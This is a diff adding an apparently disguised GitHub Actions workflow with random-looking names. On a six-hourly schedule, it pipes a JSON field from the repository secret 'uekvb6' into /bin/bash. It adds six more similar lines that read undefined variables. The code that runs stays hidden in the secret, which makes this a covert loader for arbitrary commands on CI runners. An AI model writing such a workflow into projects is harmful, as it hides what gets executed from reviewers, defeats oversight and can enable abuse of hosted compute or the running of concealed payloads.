@@ -1,0 +1,23 @@
+name: sizailehanjiuing
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sizailehanjiuing
+        env:
+          uekvb6: ${{ secrets.uekvb6 }}
+        run: |
+          echo $uekvb6 | jq -r .m80 | /bin/bash
+          echo $fnx55126 | jq -r .vlz7 | /bin/bash
+          echo $uxhf5445 | jq -r .p84210 | /bin/bash
+          echo $wdb48 | jq -r .ortur7 | /bin/bash
+          echo $rofe32 | jq -r .xpfc9081 | /bin/bash
+          echo $n9 | jq -r .fl3816 | /bin/bash
+          echo $vyd27575 | jq -r .x45 | /bin/bash
+
